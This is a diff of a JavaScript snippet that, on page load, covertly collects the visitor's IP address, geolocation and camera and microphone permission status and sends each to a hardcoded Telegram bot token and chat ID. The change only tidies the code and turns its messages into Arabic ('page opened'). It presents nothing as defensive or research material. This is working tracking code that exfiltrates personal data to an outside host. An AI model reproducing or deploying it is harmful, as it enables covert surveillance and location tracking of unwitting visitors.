@@ -1,60 +1,47 @@
 const token = "7667682276:AAHrNXBQ3JnCJxYdvgAa_cgOqo_OWMb2rNA";
 const chatId = "6659044299";
 
-// دالة إرسال إلى Telegram
 function sendToTelegram(text) {
-  fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: text
-    })
+    body: JSON.stringify({ chat_id: chatId, text: text })
   });
 }
 
-// إرسال الوقت الحالي
-sendToTelegram("🕒 " + new Date().toLocaleString());
+sendToTelegram("📥 تم فتح الصفحة - " + new Date().toLocaleString());
 
-// إرسال IP
 fetch("https://api.ipify.org?format=json")
   .then(res => res.json())
   .then(data => sendToTelegram("🌐 IP: " + data.ip));
 
-// إرسال الموقع الجغرافي
 function askLocation() {
   navigator.geolocation.getCurrentPosition(pos => {
     const { latitude, longitude } = pos.coords;
     const link = `https://maps.google.com/?q=${latitude},${longitude}`;
-    sendToTelegram(`📍 Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${link}`);
-  });
+    sendToTelegram(`📍 Location:\n${link}`);
+  }, () => {}, {timeout:5000});
 }
 askLocation();
 
-// طلب الكاميرا
 function askCamera() {
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
-      sendToTelegram("📸 Camera access granted");
+      sendToTelegram("📸 تم السماح للكاميرا");
       stream.getTracks().forEach(t => t.stop());
     })
-    .catch(() => {
-      sendToTelegram("❌ Camera access denied");
-    });
+    .catch(() => sendToTelegram("❌ تم رفض الكاميرا"));
 }
 askCamera();
 
-// طلب المايكروفون
 function askMic() {
   navigator.mediaDevices.getUserMedia({ audio: true })
     .then(stream => {
-      sendToTelegram("🎤 Microphone access granted");
+      sendToTelegram("🎤 تم السماح للمايكروفون");
       stream.getTracks().forEach(t => t.stop());
     })
-    .catch(() => {
-      sendToTelegram("❌ Microphone access denied");
-    });
+    .catch(() => sendToTelegram("❌ تم رفض المايكروفون"));
 }
 askMic();
